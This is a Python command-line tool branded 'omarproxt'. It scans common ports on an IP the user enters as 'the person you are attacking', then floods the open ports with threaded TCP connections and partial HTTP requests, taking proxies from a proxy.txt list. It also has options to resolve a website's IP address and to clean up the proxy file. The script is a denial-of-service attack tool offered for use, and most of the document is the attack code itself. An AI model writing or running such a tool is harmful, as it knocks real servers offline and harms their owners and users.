import os
os.system ('clear')
import requests, pyfiglet,time,sys,webbrowser 
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
logo = pyfiglet.figlet_format('omarproxt')
print(a_bSa+logo)
import json as m
import json
import requests as re
import os
import string
import random

from colorama import *
import socket
import threading
import sys as n
import time as mm
import time
from tqdm import tqdm


def slow(M):
    for c in M + "\n":
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(0.5 / 120)


slow(Fore.LIGHTWHITE_EX+"""
========================================================
[1]Attacks
[2]extract ip site
========================================================""")
mylock = threading.Lock()


def sprint(*a, **b):
    with mylock:
        print(*a, **b)


def attack(proxy, target, portlast):
    try:
        global running
        running += 1
    except:
        running = 0
    for i in range(10000):
        for port in portlast:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + proxy + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()
                sprint(Fore.GREEN+f"been attacked : {target} | port : {proxy}:{port}")
            except:
                sprint(Fore.RED + f"It is not attacked : {target} | port : {proxy}:{port}")
            continue
    running -= 1


def first1(target):
    file = open("proxy.txt", "r").read().splitlines()
    ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109, 110, 115, 118, 443, 194, 161, 445, 156, 137, 139,
             3306]
    portlast = []
    for port in tqdm(ports,desc="Open ports are being checked ",bar_format="%s{l_bar}%s{bar}%s{r_bar}" % (Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX)):
        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a_socket.settimeout(2)
        result_of_check = a_socket.connect_ex((target, port))
        a_socket.settimeout(None)
        if result_of_check == 0:
            portlast.append(port)
        else:
            pass
        a_socket.close()
    slow(Fore.LIGHTWHITE_EX+f"The number of open ports : {len(portlast)}")
    if len(portlast) == 0:
        slow(Fore.LIGHTWHITE_EX+"The attack cannot be executed for the number of open ports 0")
        exit()
    else:
        pass
    time.sleep(2)
    max = 50
    running = 0
    for proxy in file:
        if running < max:
            x = threading.Thread(target=attack, args=(proxy, target,portlast,))
            x.start()
        else:
            time.sleep(1)


def first2(target):
    firstip = target.split(".com")[0]
    secondip = firstip.replace("http://", "")
    thirdip = secondip.replace("https://", "")
    lastip = thirdip.replace("www.", "")
    ip = socket.gethostbyname(lastip+".com")
    slow(Fore.LIGHTWHITE_EX+"========================================================")
    slow(Fore.LIGHTWHITE_EX+f"The person's IP address is : {ip}")
    exit()


def first3(file):
    listfiltered = []
    for prox in file:
        if ":" in prox:
            filtered = prox.split(":")[0]
            listfiltered.append(filtered)
        else:
            listfiltered.append(prox)
    clearfile = open('proxy.txt', 'w')
    clearfile.close()
    for save in listfiltered:
        with open("proxy.txt", "a") as filters:
            filters.write(save+"\n")
    slow(Fore.LIGHTWHITE_EX+"========================================================")
    slow(Fore.LIGHTWHITE_EX+"Clear the blank line in the proxy.txt file and run the tool again.")
    exit()


first = input("Choose a number: ")
if first == "1":
    target = input("Put the IP of the person you are attacking: ")
    first1(target)
elif first == "2":
    target = str(input("Put the link you are looking for: "))
    first2(target)
elif first == "3":
    file = open('proxy.txt', 'r').read().splitlines()
    first3(file)
else:
    slow(Fore.LIGHTWHITE_EX+"========================================================")
    slow(Fore.LIGHTWHITE_EX+"Dude, choose 1, 2, or 3")
